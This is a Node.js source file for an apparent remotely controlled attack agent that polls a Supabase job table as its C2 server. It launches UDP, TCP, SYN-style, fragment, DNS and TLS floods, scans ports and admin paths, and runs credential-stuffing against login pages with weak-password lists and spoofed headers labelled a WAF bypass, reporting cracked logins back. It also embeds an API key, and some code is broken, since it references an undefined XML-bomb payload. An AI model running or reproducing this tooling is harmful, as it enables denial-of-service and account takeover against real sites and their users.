/**
 * SECURITYFORGE AGENT V19.0 (TRUE BREACH)
 * - V19.0: PESSIMISTIC KEYWORD ENGINE. Fixes False Positives in Login Siege.
 * - V18.0: NetJam 2.0 (SYN Flood / Frag Attack) + WAF Bypass.
 */
const https = require('https');
const http = require('http');
const http2 = require('http2');
const net = require('net');
const dgram = require('dgram');
const zlib = require('zlib');
const tls = require('tls');
const dns = require('dns');

// --- CONFIG ---
const SUPABASE_URL = "https://qbedywgbdwxaucimgiok.supabase.co";
const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFiZWR5d2diZHd4YXVjaW1naW9rIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjQ3NDA5ODEsImV4cCI6MjA4MDMxNjk4MX0.Lz0x7iKy2UcQ3jdN4AdjSIYYISBfn233C9qT_8y8jFo";

// --- ASSETS ---
const ADMIN_PATHS = ['/admin', '/login', '/wp-admin', '/dashboard', '/.env', '/config.php', '/backup.sql', '/api/v1/users', '/root', '/panel', '/phpinfo.php'];
const WEAK_CREDS = [
    ['admin', 'admin'], ['admin', '123456'], ['root', 'toor'], ['user', 'password'], 
    ['test', 'test'], ['admin', 'password'], ['root', 'root'], ['administrator', '12345678'],
    ['admin1', 'password'], ['admin', '12345'], ['guest', 'guest'], ['service', 'service'],
    ['operator', 'operator'], ['manager', 'manager'], ['support', 'support'], ['sysadmin', 'sysadmin']
];
const COMMON_PASSWORDS = [
    '123456', 'password', '12345678', 'qwerty', '123456789', '12345', '1234', '111111', '1234567', 'dragon', 'master', 'mysql', 'root123',
    'admin123', 'admin', 'pass', '1234567890', 'welcome', '123123', 'password123', 'monkey', 'letmein', 'football', 'access', 'shadow',
    'mustang', 'superman', 'michael', 'batman', '666666', '888888', 'princess', 'solo', 'starwars', 'killer', 'charlie', 'jordan', 'hockey',
    'iloveyou', 'secret', 'sunshine', 'hunter', 'login', 'admin@123', 'p@ssword', 'changeme', 'system', 'root', 'support'
];
const TOP_PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 3306, 3389, 5432, 6379, 8080, 8443];
const JUNK_DATA_SMALL = Buffer.alloc(1024 * 1, 'x');  

// --- KEEPALIVE SERVER ---
const PORT = process.env.PORT || 3000;
http.createServer((req, res) => { res.writeHead(200); res.end('SecurityForge Agent V19.0 ACTIVE'); })
    .listen(PORT, () => console.log(`[SYSTEM] Agent listening on port ${PORT}`));

// --- HELPER: NATIVE SUPABASE ---
const supabaseRequest = (method, pathStr, body = null) => {
    return new Promise((resolve, reject) => {
        try {
            const baseUrl = new URL(SUPABASE_URL);
            const apiPath = '/rest/v1' + (pathStr.startsWith('/') ? pathStr : '/' + pathStr);
            const options = {
                hostname: baseUrl.hostname,
                path: apiPath,
                method: method,
                headers: {
                    'apikey': SUPABASE_KEY,
                    'Authorization': `Bearer ${SUPABASE_KEY}`,
                    'Content-Type': 'application/json',
                    'Prefer': 'return=representation'
                }
            };
            const req = https.request(options, (res) => {
                let data = '';
                res.on('data', chunk => data += chunk);
                res.on('end', () => { 
                    if (res.statusCode >= 400) {
                        resolve(null);
                    } else {
                        try { resolve(data ? JSON.parse(data) : null); } catch(e) { resolve(null); } 
                    }
                });
            });
            req.on('error', (e) => reject(e));
            if (body) req.write(JSON.stringify(body));
            req.end();
        } catch(e) { reject(e); }
    });
};

console.log('\x1b[35m[AGENT] Initialized V19.0 (True Breach). Polling C2...\x1b[0m');

let activeJob = null;
let activeLoop = null;
let logBuffer = [];

// --- DYNAMIC SCALING (AUTO-MEM) ---
const MAX_RAM_BYTES = 400 * 1024 * 1024; 
const checkMemory = () => {
    const used = process.memoryUsage().heapUsed;
    return used < MAX_RAM_BYTES;
};

const logToC2 = (msg) => {
    console.log(msg);
    logBuffer.push(msg.replace(/\x1b\[[0-9;]*m/g, ''));
};

const startAttack = (job) => {
    if (activeJob) return;
    activeJob = job;
    const duration = (job.duration && job.duration > 0) ? job.duration : 30;
    console.log(`\x1b[31m[ATTACK] ${job.method} ${job.target} | Target: ${job.concurrency} | D: ${duration}s\x1b[0m`);
    logToC2(`[SYSTEM] Swarm Engaged. Target: ${job.target}`);
    if(job.use_port_scan) logToC2(`[RECON] Starting Port Scan on ${job.target}...`);
    if(job.use_login_siege) logToC2(`[CRACK] Starting DEEP CRACK (V19 True Breach) on Login Portal...`);
    
    let running = true;
    let totalRequests = 0;
    let jobSuccess = 0;
    let jobFailed = 0;
    let jobLatencySum = 0;
    let jobReqsForLatency = 0;
    let jobMaxLatency = 0;
    let consecutiveFailures = 0;

    // --- MODULES ---
    if (job.use_dns_reaper) {
        /* ... DNS Code ... */
        const [host, portStr] = job.target.split(':');
        const port = 53;
        const flood = () => {
             if (!running) return;
             if (!checkMemory()) return setTimeout(flood, 100);
             try {
                const client = dgram.createSocket('udp4');
                const buf = Buffer.from('aa00010000010000000000000377777706676f6f676c6503636f6d0000010001', 'hex'); 
                client.send(buf, port, host, (err) => { client.close(); totalRequests++; });
             } catch(e) {}
             if (running) setImmediate(flood);
        };
        for(let i=0; i<Math.min(job.concurrency, 300); i++) flood();
    }
    else if (job.use_syn_flood) {
        // V18: TCP SYN Flood
        const [host, portStr] = job.target.split(':');
        const port = parseInt(portStr) || 80;
        const synFlood = () => {
            if (!running) return;
            if (!checkMemory()) return setTimeout(synFlood, 50);
            try {
                const s = new net.Socket();
                s.connect(port, host, () => { s.destroy(); });
                s.on('error', () => {}); 
                jobSuccess++; totalRequests++;
            } catch(e) {}
            if (running) setImmediate(synFlood);
        }
        for(let i=0; i<Math.min(job.concurrency, 500); i++) synFlood();
    }
    else if (job.use_frag_attack) {
        // V18: UDP Frag
        const [host, portStr] = job.target.split(':');
        const port = parseInt(portStr) || 80;
        const frag = () => {
            if (!running) return;
            try {
                const client = dgram.createSocket('udp4');
                const size = Math.floor(Math.random() * 1400) + 64; 
                const buf = Buffer.alloc(size, 'X');
                client.send(buf, port, host, (err) => { client.close(); });
                jobSuccess++; totalRequests++;
            } catch(e) {}
            if (running) setImmediate(frag);
        }
        for(let i=0; i<Math.min(job.concurrency, 500); i++) frag();
    }
    else if (job.use_admin_hunter) {
        /* ... Admin Hunter Code ... */
        let targetUrl; try { targetUrl = new URL(job.target); } catch(e) { return; }
        const scan = (pathIndex) => {
            if (!running) return;
            const path = ADMIN_PATHS[pathIndex % ADMIN_PATHS.length];
            const opts = { hostname: targetUrl.hostname, path: path, method: 'GET', timeout: 3000 };
            const req = https.request(opts, (res) => {
                if (res.statusCode === 200) logToC2(`[VULN] Found Publicly Accessible: ${targetUrl.protocol}//${targetUrl.hostname}${path}`);
                else if (res.statusCode === 403) logToC2(`[WARN] Found Protected: ${path} (403)`);
                totalRequests++;
                if (running) setImmediate(() => scan(pathIndex + 1));
            });
            req.on('error', () => { if(running) setImmediate(() => scan(pathIndex + 1)); });
            req.end();
        };
        for(let i=0; i<20; i++) scan(i);
    }
    else if (job.use_port_scan) {
        /* ... Port Scan Code ... */
        let targetHost = job.target.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0];
        if (targetHost.includes('/')) targetHost = targetHost.split('/')[0];
        
        const scanPort = (idx) => {
            if (!running) return;
            const port = TOP_PORTS[idx % TOP_PORTS.length];
            const socket = new net.Socket();
            socket.setTimeout(2000);
            socket.on('connect', () => {
                logToC2(`[OPEN] Port ${port} is OPEN on ${targetHost}`);
                jobSuccess++; totalRequests++; socket.destroy(); consecutiveFailures = 0;
            });
            socket.on('timeout', () => { 
                socket.destroy(); totalRequests++; consecutiveFailures++;
                if (consecutiveFailures === 15) logToC2(`[ERROR] Target Unreachable. Are you scanning a Local IP from Cloud?`);
            });
            socket.on('error', () => { 
                totalRequests++; consecutiveFailures++; 
                if (consecutiveFailures === 15) logToC2(`[ERROR] Target Connection Failed. Check Firewall.`);
            });
            socket.connect(port, targetHost);
            if (running) setTimeout(() => scanPort(idx + 1), 200); 
        }
        for(let i=0; i<5; i++) scanPort(i); 
    }
    else if (job.use_ssl_storm) {
        /* ... SSL Code ... */
        let targetUrl; try { targetUrl = new URL(job.target); } catch(e) { return; }
        const host = targetUrl.hostname;
        const storm = () => {
            if (!running) return;
            if (!checkMemory()) return setTimeout(storm, 100);
            try {
                const socket = tls.connect(443, host, { rejectUnauthorized: false }, () => {
                     socket.destroy();
                     jobSuccess++; totalRequests++;
                });
                socket.on('error', () => { jobFailed++; totalRequests++; });
            } catch(e) {}
            if (running) setImmediate(storm);
        };
        for(let i=0; i<Math.min(job.concurrency, 400); i++) storm();
    }
    else if (job.method === 'UDP' || job.method === 'TCP') {
        /* ... L4 Code ... */
        const [host, portStr] = job.target.split(':');
        const port = parseInt(portStr) || 80;
        const flood = () => {
            if (!running) return;
            if (!checkMemory()) return setTimeout(flood, 100); 
            try {
                if (job.method === 'UDP') {
                    const client = dgram.createSocket('udp4');
                    client.send(JUNK_DATA_SMALL, port, host, (err) => {
                        client.close();
                        if (!err) jobSuccess++; else jobFailed++;
                        totalRequests++;
                    });
                } else {
                    const client = new net.Socket();
                    client.connect(port, host, () => { client.write(JUNK_DATA_SMALL); client.destroy(); jobSuccess++; totalRequests++; });
                    client.on('error', () => { jobFailed++; totalRequests++; });
                }
            } catch(e) {}
            if (running) setImmediate(flood);
        };
        for(let i=0; i<Math.min(job.concurrency, 500); i++) flood(); 
    } 
    else {
        // --- STRESS / LOGIN MODULE ---
        let targetUrl;
        try { targetUrl = new URL(job.target); } catch(e) { return; }
        const agent = new https.Agent({ keepAlive: true, keepAliveMsecs: 1000, maxSockets: Infinity });

        const performRequest = () => {
            if (!running) return;
            if (!checkMemory()) return setTimeout(performRequest, 100); 

            const lib = targetUrl.protocol === 'https:' ? https : http;
            const start = Date.now();
            let body = job.body;
            let method = job.method || 'GET';
            let creds = null;

            if (job.use_login_siege) {
                method = 'POST';
                // ATTACK PHASE
                if (job.login_type === 'PASS_ONLY') {
                    const pass = COMMON_PASSWORDS[Math.floor(Math.random() * COMMON_PASSWORDS.length)];
                    creds = ['(PIN)', pass];
                    body = JSON.stringify({ password: pass });
                } else if (job.login_type === 'MODAL_API') {
                    const pair = WEAK_CREDS[Math.floor(Math.random() * WEAK_CREDS.length)];
                    creds = pair;
                    body = JSON.stringify({ email: pair[0], password: pair[1] });
                } else {
                    const pair = WEAK_CREDS[Math.floor(Math.random() * WEAK_CREDS.length)];
                    creds = pair;
                    body = JSON.stringify({ username: pair[0], password: pair[1] });
                }
            } else if (job.use_goldeneye || job.use_xml_bomb) {
                if (job.use_xml_bomb) body = MALICIOUS_PAYLOADS.XML_BOMB;
            }

            // Headers setup
            const headers = {
                'User-Agent': 'SecurityForge/19', 
                'Content-Type': 'application/json',
                ...((typeof job.headers === 'string' ? {} : job.headers) || {})
            };
            
            // WAF BYPASS
            if (job.use_login_siege || job.use_chaos) {
                headers['X-Forwarded-For'] = '127.0.0.1';
                headers['X-Originating-IP'] = '127.0.0.1';
            }
            
            if (job.use_chaos) {
                headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' + (100+Math.floor(Math.random()*20));
            }

            const req = lib.request(targetUrl, { agent, method, headers }, (res) => {
                 const lat = Date.now() - start;
                 jobLatencySum += lat; jobReqsForLatency++; jobMaxLatency = Math.max(jobMaxLatency, lat);
                 
                 // --- V19.0 PESSIMISTIC KEYWORD ENGINE ---
                 if (job.use_login_siege) {
                     let responseBody = '';
                     res.on('data', chunk => responseBody += chunk.toString());
                     res.on('end', () => {
                         const bodyLower = responseBody.toLowerCase();
                         
                         // NEGATIVE KEYWORDS (If found, it is DEFINITELY a fail)
                         const failKeywords = ['invalid', 'incorrect', 'fail', 'error', 'wrong', 'denied', 'match', 'try again', 'reset', 'locked', 'not found', 'unauthorized'];
                         const successKeywords = ['dashboard', 'welcome', 'logout', 'my account', 'profile', 'settings', 'signed in', 'success":true', 'token":'];

                         let isBypass = false;

                         if (failKeywords.some(k => bodyLower.includes(k))) {
                             isBypass = false;
                         } else if (successKeywords.some(k => bodyLower.includes(k))) {
                             isBypass = true;
                         } else if (res.statusCode === 302 || res.statusCode === 301) {
                             // Redirect Logic
                             const loc = (res.headers.location || '').toLowerCase();
                             if (!loc.includes('login') && !loc.includes('signin') && !loc.includes('error') && !loc.includes('?fail')) {
                                 isBypass = true;
                             }
                         }

                         if (isBypass) {
                             logToC2(`[CRITICAL] LOGIN BYPASSED: [${creds[0]} / ${creds[1]}] (Status: ${res.statusCode})`);
                             jobSuccess++;
                         } else {
                             jobFailed++; 
                         }
                     });
                 } else {
                     if (res.statusCode < 500) jobSuccess++; else jobFailed++;
                     res.resume(); 
                 }

                 totalRequests++;
                 if(running) setImmediate(performRequest);
            });
            if (body) req.write(body);
            req.on('error', () => { jobFailed++; totalRequests++; if(running) setImmediate(performRequest); });
            req.end();
        };

        const spawnLoop = setInterval(() => {
             if (!running) return clearInterval(spawnLoop);
             const safeLimit = job.use_login_siege ? 200 : job.concurrency; // Throttle Login Siege for CPU
             if (checkMemory() && (totalRequests / ((Date.now() - startTime)/1000) < safeLimit)) {
                 performRequest();
             }
        }, 50);
        for(let i=0; i<20; i++) performRequest();
    }

    // Reporting Loop
    const startTime = Date.now();
    activeLoop = setInterval(async () => {
        const elapsed = (Date.now() - startTime) / 1000;
        const rps = Math.floor(totalRequests / elapsed) || 0;
        const avgLat = jobReqsForLatency > 0 ? Math.round(jobLatencySum / jobReqsForLatency) : 0;
        
        let statsPayload = { current_rps: rps, total_success: jobSuccess, total_failed: jobFailed, avg_latency: avgLat, max_latency: jobMaxLatency };
        
        const currentLogs = [...logBuffer]; 
        if (currentLogs.length > 0) {
            statsPayload.logs = currentLogs.join('\n');
        }

        try { 
            await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, statsPayload); 
            if (currentLogs.length > 0) logBuffer = [];
        } catch(e) {
            // Fallback for schema errors
            try { await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { current_rps: rps, logs: currentLogs.join('\n') }); } catch(e2) {}
        }

        if (duration > 0 && elapsed >= duration) {
            running = false;
            clearInterval(activeLoop);
            activeJob = null;
            await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { status: 'COMPLETED' });
        }
    }, 2000);
};

setInterval(async () => {
    if (activeJob) return;
    try {
        const jobs = await supabaseRequest('GET', '/jobs?status=in.(PENDING,RUNNING)&limit=1');
        if (jobs && jobs.length > 0) {
            const job = jobs[0];
            if (job.status === 'PENDING') await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { status: 'RUNNING' });
            startAttack(job);
        }
    } catch (e) { }
}, 3000);
